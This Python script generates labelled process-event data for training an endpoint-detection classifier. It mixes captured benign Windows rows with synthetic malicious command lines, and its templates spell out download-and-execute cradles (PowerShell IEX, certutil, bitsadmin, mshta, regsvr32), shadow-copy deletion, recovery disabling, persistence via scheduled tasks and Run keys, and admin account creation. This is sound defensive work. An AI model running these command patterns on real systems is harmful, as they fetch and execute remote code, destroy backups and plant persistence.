import argparse
import json
import os
import random
from collections import Counter

FIELDS = ["pid", "ppid", "name", "path", "command_line", "parent_name", "user", "is_first_seen", "label"]

SYS32 = "C:\\Windows\\System32"
PS_PATH = SYS32 + "\\WindowsPowerShell\\v1.0\\powershell.exe"
CMD_PATH = SYS32 + "\\cmd.exe"
DROP_DIRS = ["C:\\Users\\Public", "C:\\ProgramData", "C:\\Windows\\Temp", "C:\\Users\\{user}\\AppData\\Local\\Temp", "C:\\Users\\{user}\\Downloads"]
PORTS = [80, 443, 8080, 8443, 4444, 9001, 1337, 8000]

SHELL_PARENTS = ["cmd.exe", "powershell.exe", "explorer.exe"]
MACRO_PARENTS = ["WINWORD.EXE", "EXCEL.EXE", "wscript.exe", "mshta.exe", "OUTLOOK.EXE"]

USERS = ["WIN11\\vagrant"]

def rand_ip():
    return random.choice([
        f"10.10.14.{random.randint(2, 254)}",
        f"192.168.56.{random.randint(2, 254)}",
        f"172.16.{random.randint(0, 31)}.{random.randint(2, 254)}",
        f"45.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(2, 254)}",
    ])

def rand_name(n=None):
    n = n or random.randint(5, 9)
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))

def rand_b64(lo=60, hi=400):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(random.choice(chars) for _ in range(random.randint(lo, hi)))

def url(ext):
    return f"http://{rand_ip()}:{random.choice(PORTS)}/{rand_name()}.{ext}"

def drop_path(ext, user):
    short_user = user.split("\\")[-1]
    return random.choice(DROP_DIRS).format(user=short_user) + f"\\{rand_name()}.{ext}"

def invoke(exe, full_path):
    return random.choice([exe, exe.rsplit(".", 1)[0], f'"{full_path}"'])

def mrow(name, path, cmd, first_seen=False, parent=None, user=None):
    return {
        "pid": random.randint(1000, 20000),
        "ppid": random.randint(500, 12000),
        "name": name,
        "path": path,
        "command_line": cmd,
        "parent_name": parent or random.choice(SHELL_PARENTS),
        "user": user or random.choice(USERS),
        "is_first_seen": first_seen,
        "label": 1,
    }

def ps_flags():
    flags = random.sample(["-NoP", "-NonI", "-W Hidden", "-Exec Bypass"], k=random.randint(2, 4))
    if random.random() < 0.3:
        flags = [f.lower() for f in flags]
    return " ".join(flags)

def t_ps_encoded():
    enc = random.choice(["-Enc", "-EncodedCommand", "-enc", "-e"])
    cmd = f"{invoke('powershell.exe', PS_PATH)} {ps_flags()} {enc} {rand_b64()}"
    return mrow("powershell.exe", PS_PATH, cmd, parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))

def t_ps_download_cradle():
    body = random.choice([
        f"IEX (New-Object Net.WebClient).DownloadString('{url('ps1')}')",
        f"IEX(New-Object Net.WebClient).DownloadString('{url('txt')}')",
        f"Invoke-Expression (Invoke-WebRequest -UseBasicParsing {url('ps1')}).Content",
        f"iwr -useb {url('ps1')} | iex"
    ])
    cmd = f'{invoke("powershell.exe", PS_PATH)} {ps_flags()} -c "{body}"'
    return mrow("powershell.exe", PS_PATH, cmd, parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))


def t_ps_download_run():
    user = random.choice(USERS)
    dest = drop_path("exe", user)
    body = random.choice([
        f"(New-Object Net.WebClient).DownloadFile('{url('exe')}','{dest}'); Start-Process '{dest}'",
        f"Invoke-WebRequest -Uri {url('exe')} -OutFile {dest}; & {dest}",
    ])
    cmd = f'{invoke("powershell.exe", PS_PATH)} {ps_flags()} -c "{body}"'
    return mrow("powershell.exe", PS_PATH, cmd, user=user,
                parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))


def t_ps_bypass_script():
    user = random.choice(USERS)
    cmd = (f"{invoke('powershell.exe', PS_PATH)} -ExecutionPolicy Bypass "
           f"{random.choice(['-W Hidden ', '-WindowStyle Hidden ', ''])}-File {drop_path('ps1', user)}")
    return mrow("powershell.exe", PS_PATH, cmd, user=user)


def t_cmd_wrapper():
    user = random.choice(USERS)
    dest = drop_path("exe", user)
    inner = random.choice([
        f"powershell {ps_flags()} -enc {rand_b64(60, 200)}",
        f"certutil -urlcache -split -f {url('exe')} {dest} & {dest}",
        f"bitsadmin /transfer {rand_name()} /download /priority high {url('exe')} {dest} & start {dest}",
        f"mshta {url('hta')}",
        f"regsvr32 /s /n /u /i:{url('sct')} scrobj.dll",
    ])
    cmd = f"{invoke('cmd.exe', CMD_PATH)} /c {inner}"
    return mrow("cmd.exe", CMD_PATH, cmd, user=user,
                parent=random.choice(MACRO_PARENTS + ["explorer.exe", "powershell.exe"]))


def t_certutil():
    user = random.choice(USERS)
    path = SYS32 + "\\certutil.exe"
    cmd = random.choice([
        f"{invoke('certutil.exe', path)} -urlcache -split -f {url('exe')} {drop_path('exe', user)}",
        f"{invoke('certutil.exe', path)} -urlcache -f {url('dll')} {drop_path('dll', user)}",
        f"{invoke('certutil.exe', path)} -decode {drop_path('txt', user)} {drop_path('exe', user)}",
    ])
    return mrow("certutil.exe", path, cmd, user=user)


def t_mshta():
    path = SYS32 + "\\mshta.exe"
    cmd = f"{invoke('mshta.exe', path)} {url('hta')}"
    return mrow("mshta.exe", path, cmd, parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))


def t_regsvr32():
    path = SYS32 + "\\regsvr32.exe"
    cmd = f"{invoke('regsvr32.exe', path)} /s /n /u /i:{url('sct')} scrobj.dll"
    return mrow("regsvr32.exe", path, cmd, parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))


def t_rundll32():
    user = random.choice(USERS)
    path = SYS32 + "\\rundll32.exe"
    entry = random.choice(["DllMain", "Start", "Run", "EntryPoint", "#1"])
    cmd = f"{invoke('rundll32.exe', path)} {drop_path('dll', user)},{entry}"
    return mrow("rundll32.exe", path, cmd, user=user,
                parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))


def t_bitsadmin():
    user = random.choice(USERS)
    path = SYS32 + "\\bitsadmin.exe"
    cmd = (f"{invoke('bitsadmin.exe', path)} /transfer {rand_name()} /download /priority high "
           f"{url('exe')} {drop_path('exe', user)}")
    return mrow("bitsadmin.exe", path, cmd, user=user)


def t_wmic():
    path = SYS32 + "\\wbem\\WMIC.exe"
    inner = random.choice([
        f"powershell {ps_flags()} -enc {rand_b64(60, 200)}",
        f"cmd /c {drop_path('exe', random.choice(USERS))}",
    ])
    cmd = random.choice([
        f'{invoke("wmic.exe", path)} process call create "{inner}"',
        f'{invoke("wmic.exe", path)} /node:{rand_ip()} process call create "{inner}"',
        f"{invoke('wmic.exe', path)} shadowcopy delete",
    ])
    return mrow("WMIC.exe", path, cmd)


def t_schtasks():
    user = random.choice(USERS)
    path = SYS32 + "\\schtasks.exe"
    trigger = random.choice(["/sc onlogon", "/sc onstart", "/sc minute /mo 5"])
    cmd = (f"{invoke('schtasks.exe', path)} /create /tn {rand_name()} /tr {drop_path('exe', user)} "
           f"{trigger} /ru SYSTEM /f")
    return mrow("schtasks.exe", path, cmd, user=user)


def t_reg_runkey():
    user = random.choice(USERS)
    path = SYS32 + "\\reg.exe"
    hive = random.choice(["HKCU", "HKLM"])
    cmd = (f"{invoke('reg.exe', path)} add {hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
           f"/v {rand_name()} /t REG_SZ /d {drop_path('exe', user)} /f")
    return mrow("reg.exe", path, cmd, user=user)


def t_inhibit_recovery():
    vss = SYS32 + "\\vssadmin.exe"
    bcd = SYS32 + "\\bcdedit.exe"
    scope = random.choice(["/all /quiet", "/all", f"/for={random.choice('CDE')}: /quiet",
                           f"/for={random.choice('CDE')}: /oldest /quiet"])
    parent = random.choice(SHELL_PARENTS + MACRO_PARENTS + ["WMIC.exe", "rundll32.exe"])
    return random.choice([
        mrow("vssadmin.exe", vss, f"{invoke('vssadmin.exe', vss)} delete shadows {scope}",
             parent=parent),
        mrow("bcdedit.exe", bcd,
             f"{invoke('bcdedit.exe', bcd)} /set {{default}} recoveryenabled no", parent=parent),
        mrow("cmd.exe", CMD_PATH,
             f"{invoke('cmd.exe', CMD_PATH)} /c vssadmin delete shadows {scope} & "
             f"bcdedit /set {{default}} recoveryenabled no", parent=parent),
    ])


def t_account_add():
    path = SYS32 + "\\net.exe"
    acct = rand_name(6)
    cmd = random.choice([
        f"{invoke('net.exe', path)} user {acct} {rand_name(10)} /add",
        f"{invoke('net.exe', path)} localgroup administrators {acct} /add",
    ])
    return mrow("net.exe", path, cmd)


def t_dropped_exec():
    # A NEW binary run from a user-writable folder -> is_first_seen TRUE (novel exe path).
    user = random.choice(USERS)
    path = drop_path("exe", user)
    name = path.rsplit("\\", 1)[-1]
    cmd = random.choice([path, f'"{path}"', f'"{path}" -{rand_name(3)}'])
    return mrow(name, path, cmd, first_seen=True, user=user,
                parent=random.choice(SHELL_PARENTS + MACRO_PARENTS))


def t_dropped_exec_rerun():
    # The same kind of dropped binary on a later run: no longer first-seen, still malicious.
    row = t_dropped_exec()
    row["is_first_seen"] = False
    return row


FIRST_SEEN_FALSE = [t_dropped_exec_rerun, t_ps_encoded, t_ps_download_cradle, t_ps_download_run, t_ps_bypass_script,
                    t_cmd_wrapper, t_certutil, t_mshta, t_regsvr32, t_rundll32, t_bitsadmin,
                    t_wmic, t_schtasks, t_reg_runkey, t_inhibit_recovery, t_account_add]


def load_benign(path, target, max_dup):
    counts = Counter()
    first, rest = [], []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            r = json.loads(line)
            row = {k: r.get(k) for k in FIELDS if k != "label"}
            row["label"] = 0
            key = (row["name"], row["command_line"], row["parent_name"], row["is_first_seen"])
            counts[key] += 1
            if counts[key] > max_dup:      # keep a few repeats, drop the flood
                continue
            (first if row["is_first_seen"] else rest).append(row)
    random.shuffle(rest)
    keep = first + rest[:max(0, target - len(first))]  # keep ALL first-seen benign
    random.shuffle(keep)
    return keep


def build_malicious(n, first_seen_rate):
    rows = []
    n_dropped = int(n * 0.10)
    for _ in range(n_dropped):
        rows.append(t_dropped_exec())
    for _ in range(n - n_dropped):
        template = random.choice(FIRST_SEEN_FALSE)
        row = template()
        if template is not t_dropped_exec_rerun:
            row["is_first_seen"] = random.random() < first_seen_rate
        rows.append(row)
    uniq, out = set(), []
    for r in rows:
        k = (r["name"], r["command_line"], r["parent_name"], r["is_first_seen"])
        if k in uniq:
            continue
        uniq.add(k)
        out.append(r)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--capture", default="data/training/EDR/captures/benign_capture_windows.jsonl")
    ap.add_argument("--out", default="data/training/EDR/raw/process_windows.jsonl")
    ap.add_argument("--benign", type=int, default=2000, help="Max benign rows to keep.")
    ap.add_argument("--malicious-ratio", type=float, default=0.7,
                    help="Malicious rows as a fraction of the benign rows actually kept.")
    ap.add_argument("--max-dup", type=int, default=3,
                    help="Max copies of an identical benign row to keep.")
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    random.seed(args.seed)

    benign = load_benign(args.capture, args.benign, args.max_dup)
    if not benign:
        raise SystemExit(f"No benign rows found in {args.capture} - run the capture first.")

    users = sorted({r["user"] for r in benign if r.get("user")})
    if users:
        USERS[:] = users

    b_first = sum(1 for r in benign if r["is_first_seen"])
    malicious = build_malicious(int(len(benign) * args.malicious_ratio), b_first / len(benign))
    m_first = sum(1 for r in malicious if r["is_first_seen"])

    rows = benign + malicious
    random.shuffle(rows)

    if os.path.exists(args.out):
        bak = args.out + ".synthetic.bak"
        if not os.path.exists(bak):           # never overwrite the first backup
            os.replace(args.out, bak)
            print(f"backed up old {args.out} -> {bak}")

    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps({k: r[k] for k in FIELDS}) + "\n")

    shells = Counter(r["name"].lower() for r in benign
                     if r["name"].lower() in ("cmd.exe", "powershell.exe"))
    print(f"wrote {len(rows)} rows to {args.out}")
    print(f"  benign:    {len(benign)}  (first_seen true: {b_first})")
    print(f"  malicious: {len(malicious)}  (first_seen true: {m_first})")
    print(f"  users reused for malicious rows: {USERS}")
    print(f"  benign shell rows: cmd.exe={shells['cmd.exe']} powershell.exe={shells['powershell.exe']}")
    if len(benign) < 500:
        print("  WARNING: fewer than 500 benign rows - capture more varied activity before retraining.")
    if shells["cmd.exe"] < 20 or shells["powershell.exe"] < 20:
        print("  WARNING: fewer than 20 benign cmd.exe or powershell.exe rows - the model will keep "
              "flagging normal shell use. Run the Step C3 activity list during a capture.")


if __name__ == "__main__":
    main()